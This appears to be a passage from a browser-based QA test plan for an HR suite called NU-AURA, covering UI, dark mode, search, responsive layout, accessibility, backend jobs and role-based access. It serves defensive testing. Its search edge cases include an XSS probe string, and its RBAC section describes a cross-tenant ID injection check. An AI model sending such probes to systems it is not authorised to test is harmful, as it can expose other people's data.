assert    → draft content visible to author
assert    → filter by type works
screenshot → fluence-my-content.png
```

---

## MODULE 41 — NU-DRIVE (/nu-drive, /fluence/drive)

```
Browse:  folders and files listed, breadcrumb shows path
Upload:  test file → in folder, size/type shown, double-click → preview/download
Folder:  New Folder → navigate in and back
Delete:  confirm → removed
Move:    destination folder → file no longer in source
MinIO backend: read_network_requests → PUT /api/v*/files → check MinIO presigned URL used
screenshot → nu-drive.png
```

---

## MODULE 42 — NU-MAIL (/nu-mail)

```
Inbox:   sender, subject, preview, timestamp, unread count badge
Compose: To + Subject + Body → Send → in Sent, recipient sees in Inbox
Reply:   fill reply → Send → thread updated
Forward: different recipient → delivered
screenshot → nu-mail-inbox.png
```

---

## MODULE 42A — FLUENCE TEMPLATES (/fluence/templates)

```
navigate  → /fluence/templates
assert    → template library listed: name, category, preview thumbnail, usage count
Browse:   filter by category (HR, Onboarding, Policy, Meeting Notes, etc.)
Preview:  click template → preview content, metadata (author, last updated)
Use:      click "Use Template" → creates new wiki page / blog post pre-filled with template content
           assert → user can edit the pre-filled content before saving
Create (HRA/SYS): New Template → title + category + rich text body + tags → Save
           assert → template visible in library for all users
Edit:     modify existing template → Save → version history updated
Delete:   confirm dialog → removed from library

RBAC: All authenticated → browse + use; HRA/SYS → create/edit/delete templates; UNA → /auth/login
screenshot → fluence-templates.png
```

---

## MODULE 42B — FLUENCE DASHBOARD (/fluence/dashboard)

```
navigate  → /fluence/dashboard
assert    → overview metrics: total wiki pages, total blog posts, total documents
assert    → recent activity feed: latest edits, new posts, new uploads
assert    → popular content: most viewed pages/posts
assert    → my contributions: user's own wiki pages, blog posts, uploaded files
assert    → charts render correctly (not blank boxes)

Quick Actions: links to create wiki page, write blog post, upload to drive
  click each → navigates to correct creation flow

RBAC: All authenticated → view dashboard; metrics scope based on role permissions
screenshot → fluence-dashboard.png
```

---

## MODULE 43 — GLOBAL NAVIGATION & UI/UX DEEP VALIDATION

### 43.1 Sidebar Navigation — Structure & Behavior

```
Sections: HOME, MY SPACE, PEOPLE, HR OPERATIONS, PAY & FINANCE,
          PROJECTS & WORK, REPORTS & INSIGHTS, ADMIN
click each group → sub-items expand with smooth animation (not instant jump)
click each sub-item → correct page loads
assert    → active item highlighted with sidebar-active-bg
assert    → active item has left border (#818cf8)
assert    → only ONE section expanded at a time (accordion behavior) OR all expandable
assert    → group expand/collapse has chevron rotation animation (▶ → ▼)
assert    → sidebar scroll when items exceed viewport (smooth scroll, not jumpy)
assert    → scroll position persists on page navigation (not reset to top)
assert    → active item auto-scrolls into view if below fold
assert    → MY SPACE items NEVER show lock icon or disabled state (accessible to ALL roles)
assert    → badge counts on sidebar items (e.g., Approvals: 5) update in real-time
assert    → sidebar width: 280px expanded, 64px collapsed (not arbitrary)
assert    → sidebar dividers between section groups present and subtle
assert    → icon color matches text color (not mismatched gray vs white)
screenshot → sidebar-full-expanded.png
```

### 43.2 Sidebar Collapse / Expand

```
click     → Collapse (⌘B) → icon-only mode, main content expands
assert    → transition smooth (width: 280px → 64px with CSS transition ~200ms)
assert    → icons centered in collapsed state
assert    → tooltip on hover shows full label in collapsed mode
assert    → active item still highlighted in collapsed mode (bg color, not border text)
assert    → sub-items accessible via flyout/popover on hover in collapsed mode
assert    → main content area expands to fill freed space (no gap)
assert    → no layout shift or content reflow on collapse/expand
Expand    → full labels return, no layout shift
assert    → collapse state persists across page navigation
assert    → collapse state persists across browser refresh (stored in localStorage)
assert    → ⌘B keyboard shortcut works from any page
screenshot → sidebar-collapsed.png, sidebar-collapsed-hover.png
```

### 43.3 App Switcher (Waffle Grid)

```
click     → waffle/grid icon (top bar)
assert    → panel: NU-HRMS, NU-Hire, NU-Grow, NU-Fluence
assert    → each app card has: icon, name, description, status badge
assert    → active app highlighted (outlined or filled differently)
assert    → locked apps show lock icon for roles without permission
assert    → hover state on each app card (subtle bg change + cursor pointer)
assert    → click outside panel → closes
assert    → Escape key → closes
assert    → panel positioned correctly (not clipped by viewport)
assert    → animation: panel slides/fades in (not instant appear)
click     → NU-Hire → route changes, sidebar updates to Hire modules
click     → NU-HRMS → returns to HRMS modules
assert    → app switcher icon updates to reflect active app (if icon changes)
assert    → transition between apps feels instant (< 300ms perceived)

# App-Aware Sidebar Validation
navigate to /employees → sidebar shows HRMS modules
navigate to /recruitment → sidebar shows Hire modules
navigate to /performance → sidebar shows Grow modules
navigate to /fluence/wiki → sidebar shows Fluence modules
assert    → sidebar sections match active app (no cross-app bleeding)
screenshot → app-switcher-panel.png
```

### 43.4 Dark Mode — Comprehensive

```
click     → moon/crescent icon
assert    → document.documentElement.classList.contains('dark')
assert    → transition smooth (bg/text colors animate, not instant flash)
assert    → sidebar bg: #0c0c0e (Slate 950)
assert    → main content bg: Slate 900 (#0f172a) or similar dark
assert    → card bg: Slate 800 or darker (not same as page bg — needs contrast)
assert    → all cards use dark CSS var backgrounds, text readable
assert    → charts adapt (no hardcoded fills — Recharts uses theme vars)
screenshot → dark-mode-full.png

# Dark Mode — Component-Level Validation
assert    → input fields: dark bg with light text, visible borders
assert    → input placeholder text: subtle gray (not invisible, not bright)
assert    → dropdown menus: dark bg, light text, hover highlight visible
assert    → modals: dark bg, backdrop overlay darker
assert    → tables: alternating row colors visible (subtle contrast difference)
assert    → table header: distinct from body (darker or lighter shade)
assert    → badges: text readable on dark badge variants (check green, red, yellow, sky)
assert    → tooltips: dark tooltip bg with light text (or inverted from main bg)
assert    → avatars: visible against dark bg (border or ring present)
assert    → dividers/borders: visible but subtle (Slate 700 or similar)
assert    → scrollbar: dark-themed (not default white browser scrollbar)
assert    → code blocks: dark syntax highlighting theme
assert    → calendar cells: today/selected clearly visible
assert    → status indicators: green/red/yellow dots visible on dark bg
assert    → progress bars: visible track and fill on dark bg
assert    → skeleton loaders: shimmer animation visible on dark bg
assert    → empty state illustrations: not broken/invisible on dark bg
assert    → PDF/document previews: handle dark mode gracefully
assert    → no CSS !important overriding dark vars (search for hardcoded white)

# Dark Mode — Color Contrast Audit
javascript_tool:
  // Check all text elements for contrast ratio
  const elems = document.querySelectorAll('p, span, h1, h2, h3, h4, h5, h6, a, label, td, th, li');
  let lowContrast = 0;
  elems.forEach(el => {
    const style = getComputedStyle(el);
    const color = style.color;
    const bg = style.backgroundColor;
    if (bg === 'rgba(0, 0, 0, 0)') return; // transparent
    // Log elements with potentially low contrast
    if (color === bg) { lowContrast++; console.log('Same fg/bg:', el.textContent.slice(0, 30)); }
  });
  console.log('Potential low-contrast elements:', lowContrast);
assert    → 0 same-color fg/bg elements

click     → toggle back → light mode restored
assert    → dark mode preference persists across page reload (localStorage/cookie)
assert    → dark mode preference syncs with OS prefers-color-scheme (if auto mode exists)
screenshot → dark-mode-cards.png, dark-mode-forms.png, dark-mode-tables.png
```

### 43.5 Global Search (⌘K) — Deep Validation

```
press     → ⌘K or click search bar
assert    → command palette opens with focus in search input
assert    → backdrop overlay visible (dims background)
assert    → recent searches shown below input (if feature exists)
assert    → placeholder text: "Search employees, pages, settings..."

type      → employee name (3 chars) → employee results with avatar/name/role
assert    → results appear within 300ms (debounced, not per-keystroke)
assert    → results grouped by category: People, Pages, Settings
assert    → each result has: icon, title, subtitle, category badge
assert    → keyboard navigation: ↑↓ to select, Enter to navigate, Escape to close
assert    → selected result has visible highlight (bg color change)
assert    → results scroll if > 8 items (virtualized or scrollable)

type      → project name → project results appear
type      → module name (e.g., "payroll") → navigation results to /payroll

# Edge Cases
type      → single character "a" → no search triggered (min 2-3 chars)
type      → "asdkjhaskdj" (gibberish) → "No results found" message (not blank)
type      → "<script>alert(1)</script>" → sanitized, no script execution
type      → very long string (100 chars) → input truncates or scrolls (no overflow)
clear     → backspace all text → recent searches shown again or empty state
Escape    → closes cleanly, focus returns to previous element
click outside → closes cleanly

# Accessibility
assert    → command palette has role="dialog" or role="combobox"
assert    → search input has aria-label or associated label
assert    → results have aria-selected on focused item
assert    → ⌘K shortcut does NOT trigger when typing in another input field
screenshot → global-search-results.png, global-search-empty.png
```

### 43.6 Notifications Bell (Real-Time) — Deep Validation

```
click     → bell → panel opens with type icon, message, timestamp
assert    → panel slides in from right or drops down (animated, not instant)
assert    → notifications sorted by date (newest first)
assert    → each notification has: icon (type-specific), title, body preview, relative timestamp
assert    → unread notifications have distinct bg (bold text or dot indicator)
assert    → click notification → navigates to relevant page + marks as read
assert    → right-click or action menu: Mark as Read, Delete (if supported)
Mark all read → unread badge clears → toast "All notifications marked as read"
empty state → EmptyState component (illustration + "You're all caught up!"), not blank

# Real-Time Updates
assert    → new notification increments badge without refresh (WebSocket/STOMP)
assert    → badge count updates: 0→1 shows badge; read all→ badge disappears (not shows "0")
assert    → notification sound/vibration (if configured) — not tested but verify no JS error

# Notification Types
assert    → leave approval: shows "Leave Request Approved" with leave dates
assert    → expense approval: shows "Expense Approved" with amount
assert    → mention: shows "@YourName mentioned you in..." with link
assert    → system: shows "System maintenance scheduled..." with time

# Overflow
assert    → 50+ notifications: panel scrolls, lazy loads older items (not all at once)
assert    → scroll to bottom → "Load more" or infinite scroll triggers
assert    → notification panel width: ~400px (not full width or too narrow)
assert    → panel doesn't overflow viewport on mobile

# Panel Close Behavior
click outside → panel closes
Escape → panel closes
navigate to another page → panel closes
screenshot → notifications-panel.png, notifications-empty.png
```

### 43.7 Header — Component Deep Validation

```
navigate  → any page
assert    → header height: 64px (consistent across all pages)
assert    → header sticky on scroll (position: sticky or fixed)
assert    → header elements left-to-right: hamburger(mobile)/logo, breadcrumb, spacer, search, notifications, dark mode, app switcher, user avatar
assert    → user avatar shows: initials or photo, click → dropdown menu
assert    → dropdown menu: profile link, settings link, logout button
assert    → header bg matches design system (white light / Slate 900 dark)
assert    → header shadow: subtle bottom shadow (box-shadow) for depth
assert    → z-index: header above page content, below modals
assert    → header responsive: search collapses to icon on mobile, avatar shrinks

# User Avatar Dropdown
click     → user avatar
assert    → dropdown shows: user name, email, role badge
assert    → dropdown items: My Profile, Settings, Help, Logout
assert    → click My Profile → /me/profile
assert    → click Logout → session cleared, redirect to /auth/login
assert    → dropdown has divider between navigation items and logout
assert    → click outside → dropdown closes
assert    → keyboard: Enter opens, arrow keys navigate, Escape closes
screenshot → header-user-dropdown.png
```

### 43.8 Breadcrumbs — Deep Validation

```
navigate  → /employees/[id]
assert    → Home > Employees > [Name]
click     → Employees breadcrumb → /employees list
click     → Home breadcrumb → /dashboard

# Breadcrumb Structure
assert    → separator between items: ">" or "/" or chevron icon
assert    → last breadcrumb item is NOT a link (current page — plain text or bold)
assert    → all intermediate items are clickable links (underline on hover)
assert    → breadcrumb wraps on mobile (not truncated with "..." hiding middle items)
assert    → breadcrumb trail max depth: 4 levels (Home > Module > Section > Item)
assert    → breadcrumb updates on route change (not stale from previous page)

# Special Cases
navigate  → /admin/roles → assert breadcrumb: Home > Admin > Roles
navigate  → /fluence/wiki/[page-id] → assert breadcrumb: Home > Wiki > [Page Title]
navigate  → /employees/[id]/documents → assert: Home > Employees > [Name] > Documents
assert    → long employee/page names truncated with ellipsis (tooltip shows full name)
screenshot → breadcrumbs-deep.png
```

### 43.9 Responsive Testing — 5 Breakpoints

```
# Desktop XL (1440 × 900)
resize_window → 1440 × 900
assert    → full sidebar visible, content area spacious
assert    → tables show all columns without horizontal scroll
assert    → dashboard widgets in 3-4 column grid
screenshot → responsive-1440.png

# Desktop Standard (1280 × 900)
resize_window → 1280 × 900
assert    → full layout, no overflow
assert    → tables may horizontally scroll on wide datasets (acceptable)
assert    → dashboard widgets in 3 column grid
screenshot → responsive-1280.png

# Tablet Landscape (1024 × 768)
resize_window → 1024 × 768
assert    → sidebar auto-collapses OR stays full width with smaller text
assert    → tables scroll horizontally
assert    → dashboard widgets in 2 column grid
assert    → modals still centered with padding
screenshot → responsive-1024.png

# Tablet Portrait (768 × 1024)
resize_window → 768 × 1024
assert    → sidebar fully collapsed to hamburger menu
assert    → hamburger icon visible in header → click → sidebar slides in as overlay
assert    → sidebar overlay has backdrop (click outside closes)
assert    → tables switch to card layout OR scroll horizontally with sticky first column
assert    → dashboard widgets stack to 1-2 column grid
assert    → forms: labels above inputs (not side-by-side)
assert    → action buttons: full width on cards
assert    → date pickers: calendar fits viewport
screenshot → responsive-768.png

# Mobile (375 × 812)
resize_window → 375 × 812
assert    → text readable (min 14px body text, 18px headings)
assert    → tap targets ≥ 44px height (iOS HIG) with ≥ 8px spacing between
assert    → no horizontal scrollbar on body (CRITICAL — file bug if present)
assert    → hamburger menu only way to access sidebar
assert    → search bar collapses to icon (tapping opens full search)
assert    → notification bell: panel becomes full-screen or bottom sheet
assert    → tables: card layout with key fields, "View Details" expands
assert    → forms: single column, full-width inputs
assert    → buttons: full-width CTAs at bottom of forms
assert    → modals: full-screen takeover (not floating card)
assert    → images/avatars scale down proportionally
assert    → pagination: simplified (prev/next only, no page numbers)
assert    → long text wraps (no overflow with ellipsis hiding critical data)
assert    → bottom navigation bar (if present): thumb-reachable
assert    → pull-to-refresh gesture works on list pages (if implemented)
screenshot → responsive-375.png

# Orientation Change
resize_window → 812 × 375 (landscape mobile)
assert    → content adapts to landscape (wider but shorter viewport)
assert    → sidebar doesn't auto-open on landscape
assert    → forms still usable (input fields not cut off by keyboard area)
screenshot → responsive-landscape.png
```

### 43.10 Accessibility — Comprehensive Audit

```javascript
// Inject axe-core and run
const s = document.createElement('script');
s.src = 'https://cdnjs.cloudflare.com/ajax/libs/axe-core/4.7.2/axe.min.js';
document.head.appendChild(s);
await new Promise(r => setTimeout(r, 1000));
const r = await axe.run();
console.log(JSON.stringify(r.violations.map(v => ({
  id: v.id, impact: v.impact, nodes: v.nodes.length, desc: v.description
}))));
```

```
assert → 0 critical violations per page
assert → keyboard Tab order is logical (left-to-right, top-to-bottom)
assert → all inputs have <label> (not placeholder-only)
assert → focus rings visible on all interactive elements
```

### 43.11 Page Transition & Loading UX

```
# Route Change Transitions
navigate  → /employees → /leave → /payroll (rapid navigation)
assert    → page transitions smooth (no white flash between routes)
assert    → loading indicator visible during data fetch (skeleton or progress bar)
assert    → browser back/forward buttons work correctly (history stack intact)
assert    → URL updates immediately on navigation (not delayed)
assert    → page title (<title>) updates on each route change
assert    → no "flicker" of old page content before new page renders (FOUC)

# Loading States Hierarchy
assert    → page-level: NuAuraLoader (full-page skeleton layout)
assert    → section-level: SkeletonCard / SkeletonStatCard (within a section)
assert    → table-level: SkeletonTable (matching column count)
assert    → inline-level: spinner on buttons during async actions
assert    → NEVER: plain text "Loading...", raw spinner without context, blank white space

# Error Recovery UX
simulate  → API timeout (network throttle to Slow 3G)
assert    → timeout error shown within 15s (not spinning forever)
assert    → "Retry" button present on timeout
assert    → click Retry → re-fetches data (does not reload entire page)
assert    → partial page load: header/sidebar always visible (only content area errors)

# 404 Page
navigate  → /nonexistent-route
assert    → custom 404 page with NU-AURA branding (not Next.js default)
assert    → "Go Home" or "Go Back" button present
assert    → 404 page has sidebar and header (not completely blank page)
screenshot → 404-page.png

# Optimistic Updates
create employee → assert list shows new employee IMMEDIATELY (before API confirms)
delete item → assert item disappears IMMEDIATELY (before API confirms)
if API fails → item rolls back with error toast
```

### 43.12 Micro-Interactions & Animation Quality

```
# Button Interactions
hover     → primary button → bg slightly darker (sky-700 → sky-800)
assert    → hover transition duration: ~150ms (not instant, not sluggish)
press     → button → pressed/scale effect visible (scale(0.98) or similar)
assert    → disabled buttons: opacity reduced, cursor: not-allowed, no hover effect
assert    → loading buttons: spinner replaces text or appears inline, button disabled
assert    → button ripple effect (if Mantine default) — verify consistent

# Card Interactions
hover     → interactive card → subtle shadow increase or border highlight
assert    → cursor: pointer on clickable cards
assert    → card press → navigation (entire card clickable, not just text)
assert    → card hover does NOT shift layout (no margin/padding change on hover)

# Dropdown/Select Animations
click     → dropdown → options animate in (slide down / fade in)
assert    → transition: ~150-200ms (not instant)
assert    → selected option has checkmark or highlight
assert    → dropdown closes with reverse animation

# Tab Switching
click     → tab → content transitions (fade or slide)
assert    → active tab indicator (underline / bg change) animates to position
assert    → no content "jump" when switching tabs (consistent height or smooth resize)
assert    → tab content preserves state (filled form in tab A still filled after switching to B and back)

# Accordion/Collapse
click     → expand section → content slides down smoothly
assert    → chevron icon rotates (0° → 180°) with transition
assert    → collapse → content slides up (not instant disappear)
assert    → height transition: ~200-300ms

# Toggle Switch
click     → toggle → knob slides with transition
assert    → color change: off (gray) → on (sky/green) with smooth transition
assert    → toggle has aria-checked attribute updating correctly

# Scroll Behaviors
scroll    → long page → "Back to Top" button appears (if implemented)
assert    → smooth scroll on anchor links (not instant jump)
assert    → sticky elements (header, table headers) don't jitter during scroll
assert    → infinite scroll: new items fade/slide in (not instant appear)

# Drag & Drop (Kanban, reorder)
drag      → candidate card in pipeline → visual feedback:
assert    → dragged item has elevated shadow (lifted appearance)
assert    → drop zone highlighted on hover
assert    → placeholder appears at drop location
assert    → smooth transition on drop (card settles into position)
assert    → failed drop → card returns to original position with animation

# Number/Counter Animations
navigate  → /dashboard → stat cards
assert    → numbers count up from 0 to value (counter animation)
assert    → animation duration: ~500ms (not too fast, not too slow)
assert    → large numbers formatted during animation (not showing raw digits)

screenshot → micro-interactions-hover.png, micro-interactions-buttons.png
```

### 43.13 Typography & Text Rendering

```
# Font Loading
navigate  → any page
javascript_tool:
  document.fonts.ready.then(() => {
    const loaded = [...document.fonts].filter(f => f.status === 'loaded');
    console.log('Loaded fonts:', loaded.map(f => `${f.family} ${f.weight}`).join(', '));
    console.log('IBM Plex Sans loaded:', loaded.some(f => f.family.includes('IBM Plex')));
  });
assert    → IBM Plex Sans loaded (not fallback system font)
assert    → no FOIT (Flash of Invisible Text) — text visible even before font loads
assert    → no FOUT (Flash of Unstyled Text) — minimal layout shift when font swaps

# Heading Hierarchy
javascript_tool:
  const headings = document.querySelectorAll('h1, h2, h3, h4, h5, h6');
  const levels = [...headings].map(h => ({ tag: h.tagName, text: h.textContent.trim().slice(0, 40) }));
  console.log('Heading hierarchy:', JSON.stringify(levels));
assert    → exactly 1 <h1> per page (page title)
assert    → no skipped levels (h1 → h3 without h2 = violation)
assert    → heading sizes descending: h1 > h2 > h3 (visually)

# Text Readability
assert    → body text: 14-16px (not smaller than 14px)
assert    → line height: 1.5-1.6 for body text (not cramped 1.0)
assert    → paragraph max width: ~65-75 characters per line (not full 1440px width)
assert    → text color contrast ≥ 4.5:1 against background (WCAG AA)
assert    → link text distinguishable from plain text (underline or distinct color)
assert    → link hover: underline appears or color shifts

# Number Formatting
assert    → currency: ₹1,23,456.00 (Indian format with ₹ symbol)
assert    → percentages: 85.5% (not 0.855)
assert    → dates: "02 Apr 2026" or "Apr 2, 2026" (not 2026-04-02T00:00:00Z)
assert    → relative dates: "2 hours ago", "Yesterday" (not raw ISO)
assert    → employee IDs: consistent format (EMP-0001 or similar)
assert    → phone: formatted with country code (+91 98765 43210)
assert    → large numbers: abbreviated (12.5K, 1.2M) on cards, full on detail views

# Text Truncation
assert    → long names truncated with ellipsis (text-overflow: ellipsis)
assert    → truncated text has tooltip on hover showing full text
assert    → table cells with long content: truncated with tooltip
assert    → no truncation in form labels (labels always fully visible)
assert    → breadcrumb items: truncated middle items with tooltip
screenshot → typography-hierarchy.png
```

### 43.14 Color System & Design Token Validation

```
# Primary Color Palette (Sky — NOT Purple)
javascript_tool:
  const allElements = document.querySelectorAll('*');
  let purpleFound = 0;
  allElements.forEach(el => {
    const style = getComputedStyle(el);
    const props = ['backgroundColor', 'color', 'borderColor', 'outlineColor'];
    props.forEach(prop => {
      const val = style[prop];
      if (val && (val.includes('103, 88, 168') || val.includes('99, 102, 241') ||
          val.includes('139, 92, 246') || val.includes('124, 58, 237'))) {
        purpleFound++;
        console.log('PURPLE found:', el.tagName, el.className.slice(0, 50), prop, val);
      }
    });
  });
  console.log('Total purple elements:', purpleFound);
assert    → 0 purple elements found (migration to Sky complete)
assert    → primary buttons: sky-700 (#0369a1) bg, white text
assert    → primary hover: sky-800 (#075985)
assert    → focus rings: ring-sky-700 (2px solid)
assert    → links: sky-700 text (not blue-600, not purple)

# Semantic Colors
assert    → success: green-500/600 (checkmarks, approved badges, success toasts)
assert    → error: red-500/600 (error messages, rejected badges, destructive buttons)
assert    → warning: amber-500/yellow-500 (warning banners, pending badges)
assert    → info: sky-500/600 (info banners, neutral badges)
assert    → neutral: slate-500/600 (secondary text, disabled states)

# Status Badge Colors
navigate  → /employees → check status badges
assert    → "Active": green bg, green text (bg-green-100 text-green-700)
assert    → "Inactive": red bg, red text
assert    → "On Leave": yellow/amber bg
assert    → "Probation": sky/blue bg
assert    → all badge text readable against badge bg (4.5:1 contrast)

navigate  → /leave → check leave status
assert    → "Approved": green
assert    → "Pending": amber/yellow
assert    → "Rejected": red
assert    → "Cancelled": gray

# Design Token File Validation
javascript_tool:
  const root = getComputedStyle(document.documentElement);
  const tokens = ['--font-sans', '--font-serif', '--font-mono'];
  tokens.forEach(t => console.log(t + ':', root.getPropertyValue(t)));
assert    → CSS custom properties defined for fonts
assert    → spacing uses 8px grid (check padding/margins are multiples of 4/8)
screenshot → color-system-badges.png, color-system-buttons.png
```

### 43.15 Spacing & Layout Grid Validation

```
# 8px Grid System
javascript_tool:
  const cards = document.querySelectorAll('[class*="Card"], .card, [class*="card"]');
  let violations = 0;
  cards.forEach(card => {
    const style = getComputedStyle(card);
    const padding = parseFloat(style.paddingTop);
    if (padding % 4 !== 0) {
      violations++;
      console.log('Non-grid padding:', card.className.slice(0, 40), padding + 'px');
    }
  });
  console.log('Spacing grid violations:', violations);

# Banned Spacing Values (per design system)
assert    → no gap-3 (12px — not on 8px grid)
assert    → no p-3 (12px)
assert    → no p-5 (20px)
assert    → no m-3 (12px)
Allowed:  → p-2 (8px), p-4 (16px), p-6 (24px), p-8 (32px)

# Visual Spacing Consistency
assert    → card padding: consistent across all modules (16px or 24px)
assert    → section gap: consistent (24px or 32px between major sections)
assert    → form field gap: consistent (16px between fields)
assert    → button group gap: 8px between adjacent buttons
assert    → table cell padding: consistent (12px or 16px horizontal)
assert    → sidebar item height: consistent (40px or 44px per item)
assert    → stat card grid: equal gap between cards
assert    → page margins: 24px or 32px on all sides

# Content Width
assert    → main content max-width: ~1200-1400px (not full width on 4K screens)
assert    → content centered with equal margins on ultra-wide screens
assert    → form max-width: ~600-800px (not stretching full width)
assert    → text blocks max-width: ~720px for readability

# Alignment
assert    → left-aligned text throughout (not center-aligned body text)
assert    → numbers right-aligned in table columns
assert    → buttons right-aligned in form footers (Save / Cancel)
assert    → icons vertically centered with adjacent text
assert    → avatar images vertically centered with name text
screenshot → spacing-grid-validation.png
```

### 43.16 Icon Consistency & Visual Quality

```
# Icon Library Check
javascript_tool:
  const svgs = document.querySelectorAll('svg');
  const icons = [...svgs].filter(s => {
    const w = s.getAttribute('width') || s.style.width;
    return w && parseInt(w) <= 32; // Likely icons, not charts
  });
  console.log('SVG icons on page:', icons.length);
  // Check for broken icons (empty SVGs)
  const empty = icons.filter(s => s.innerHTML.trim() === '' || s.children.length === 0);
  console.log('Empty/broken SVGs:', empty.length);
assert    → 0 empty/broken SVG icons

# Icon Sizing
assert    → inline icons (next to text): 16px × 16px
assert    → button icons: 20px × 20px
assert    → section header icons: 24px × 24px
assert    → empty state illustrations: 48-64px
assert    → all icons same stroke width (consistent line weight)

# Icon Semantics
assert    → edit actions: pencil/pen icon
assert    → delete actions: trash icon (red or neutral)
assert    → add actions: plus icon
assert    → search: magnifying glass icon
assert    → settings: gear icon
assert    → download: download/arrow-down icon
assert    → close/dismiss: X icon
assert    → back: left arrow or chevron-left
assert    → external link: arrow-up-right icon (opens in new tab)
assert    → no generic "?" or broken square (□) icons anywhere

# Icon Accessibility
assert    → decorative icons: aria-hidden="true"
assert    → icon-only buttons: have aria-label (e.g., "Edit employee")
assert    → icon color matches text context (not random colors)
screenshot → icon-consistency.png
```

### 43.17 Empty State & Zero-Data UI

```
# Test empty states for EVERY major module
For each: /employees (new tenant), /leave, /attendance, /payroll, /expenses, /assets,
          /recruitment, /performance, /okr, /training, /recognition, /helpdesk,
          /announcements, /fluence/wiki, /fluence/blogs, /nu-drive

assert    → <EmptyState> component rendered (NOT blank white space)
assert    → illustration/icon relevant to the module (employees icon for employees, etc.)
assert    → title: descriptive ("No employees yet", "No leave requests")
assert    → description: explains what to do ("Add your first employee to get started")
assert    → CTA button: "Add Employee" / "Apply Leave" / "Create Post" (action-oriented)
assert    → CTA button navigates to creation flow
assert    → empty state is centered in the content area (vertically + horizontally)
assert    → empty state looks good in both light and dark mode
assert    → empty state is responsive (scales down on mobile)
assert    → no stray table headers or filter bars visible when data is empty

# Filtered Empty State (different from zero-data)
navigate  → /employees → filter by non-existent department
assert    → "No results match your filters" message (NOT "No employees yet")
assert    → "Clear Filters" button present → click → full list restored
assert    → filtered empty state is visually DIFFERENT from zero-data empty state
screenshot → empty-states-montage.png
```

### 43.18 Scroll & Overflow Validation

```
# Page-Level Scroll
navigate  → page with 100+ items
assert    → smooth scroll (scroll-behavior: smooth or momentum scroll on mobile)
assert    → scrollbar styled (thin, matches theme — not default browser fat scrollbar)
assert    → scroll-to-top button appears after scrolling 2+ viewports down
assert    → click scroll-to-top → smooth scroll to top

# Container Scroll
assert    → sidebar: own scroll independent of main content
assert    → notification panel: own scroll
assert    → modal body: own scroll (header/footer sticky)
assert    → table body: vertical scroll with sticky header
assert    → code blocks: horizontal scroll (not wrapping code)
assert    → NO nested scrollbars (scrollable div inside scrollable div — confusing UX)

# Overflow Prevention
resize_window → 375 × 812
assert    → no horizontal scrollbar on <body> (CRITICAL)
assert    → long unbroken strings (URLs, IDs) wrap with word-break or show ellipsis
assert    → long email addresses in profile cards don't overflow card boundary
assert    → table of contents / sidebar menus don't overflow their container
screenshot → scroll-behavior.png
```

### 43.19 Print Styles Validation

```
# Print Preview (relevant for payslips, reports, letters)
navigate  → /me/payslips → view a payslip
trigger   → print preview (window.print() or ⌘P)
assert    → header/sidebar hidden in print
assert    → content fills page width
assert    → colors print-friendly (dark text on white bg)
assert    → page breaks between sections (not cutting tables mid-row)
assert    → company logo visible in print header
assert    → footer with page number present

navigate  → /reports → generate a report → print preview
assert    → charts render in print (not blank boxes)
assert    → tables have borders for readability in print

navigate  → /letters → preview a letter → print
assert    → letter template renders correctly (letterhead, body, signature)
screenshot → print-preview-payslip.png
```

---

## INFRASTRUCTURE & BACKEND CHECKS

### INF-1 — Kafka Event Processing

```
# Trigger a flow that produces Kafka events
Submit leave request → Approve it as MGR
read_network_requests → check approval call succeeds → 200
assert    → within 5s: ESS receives notification (Kafka consumer processed event)
assert    → audit log entry created (nu-aura.audit topic consumed)

# Dead Letter Queue
Check FailedKafkaEvent table for any stuck events:
navigate  → /admin/kafka-dlq (if UI exists) OR
GET /api/v*/admin/failed-events → assert empty or show DLT entries
screenshot → kafka-dlq-status.png
```

### INF-2 — Scheduled Jobs Monitoring

```
# 24 @Scheduled jobs run across the platform
navigate  → /admin/scheduled-jobs (if UI exists) OR
GET /api/v*/admin/jobs → assert job list with last-run timestamps
Critical jobs to verify ran recently:
  - leave-accrual-job: last run within 24h (monthly cron)
  - attendance-summary-job: last run recently
  - contract-expiry-notification: active
  - rate-limit-cleanup: last run within 1h
assert    → no jobs in ERROR state
assert    → ShedLock (V91) prevents duplicate concurrent runs
screenshot → scheduled-jobs.png
```

### INF-3 — File Storage (MinIO backend / Google Drive transition)

```
# MinIO removed from docker-compose (using Google Drive for file storage)
# Backend still has MinioStorageProvider.java — verify which storage is active
# Upload a file (any module with upload: expenses receipt, employee document, drive)
navigate  → /expenses → Create expense with receipt attachment
assert    → file uploads successfully (no 500, no timeout)
read_network_requests → assert PUT/POST to /api/v*/files → 200/201
assert    → file ID returned, thumbnail visible
Download: click file → opens correctly (not 404 or blank)
Note: if Google Drive enabled (enable_google_drive flag), files route through GDrive API
      if disabled, falls back to MinIO (must be externally provisioned, not in docker-compose)
screenshot → file-upload-success.png
```

### INF-4 — Elasticsearch Search Validation

```
# Full-text search should use ES, not DB LIKE
navigate  → /fluence/search or global search (⌘K)
type      → keyword with a typo (e.g., "employe" instead of "employee")
assert    → fuzzy results returned (Elasticsearch fuzzy matching)
type      → multi-word phrase → phrase-match results ranked higher
assert    → search results return within 2s
read_network_requests → GET /api/v*/search → 200 (ES endpoint, not DB endpoint)
screenshot → elasticsearch-search.png
```

### INF-5 — Email Notification Delivery (SMTP via Kafka)

```
# Trigger email-generating event
submit leave request → check email notification
navigate  → /admin/email-logs (if UI exists) OR
GET /api/v*/admin/notifications?type=EMAIL → assert SENT status
assert    → email templates rendered correctly (no raw template variables)
assert    → no SMTP errors in logs
Note: Twilio SMS mocked in dev — verify mock call logged, not actual SMS
```

### INF-6 — WebSocket/STOMP Connection

```
javascript_tool:
  // Check active STOMP connection
  console.log('STOMP client:', !!window._stompClient);
  // Or check WebSocket in network tab
assert    → WebSocket connection established on dashboard load
read_network_requests → ws:// or wss:// connection to /ws endpoint
assert    → connection survives 5 minutes (no silent disconnect)
Reconnect test: simulate disconnect → assert auto-reconnect within 10s
screenshot → websocket-connected.png
```

---

## GLOBAL RBAC MATRIX

Test every route for every role using direct URL navigation (bypasses UI hiding):

```
For each route + each role:
  login as role → navigate directly via URL → assert expected behavior

Legend:
  ✅ PASS  = correct access
  🔒 BLOCK = correctly blocked (403 or redirect, NEVER blank page)
  ❌ FAIL  = unexpected access (file Critical or High bug)
  ⚠️ SCOPE = accessible but correctly scope-limited
  ⬜ SKIP  = not tested this run
```

**Cross-tenant isolation (CRITICAL):**

```
login as Tenant A employee
inject Tenant B employee ID: /employees/[TENANT_B_ID]
assert  → 403 or not-found — NEVER returns Tenant B data
if data leaks → Critical severity bug immediately
```

**Permission normalization check:**

```
# DB format: employee.read | Code format: EMPLOYEE:READ
# Both should produce the same access result
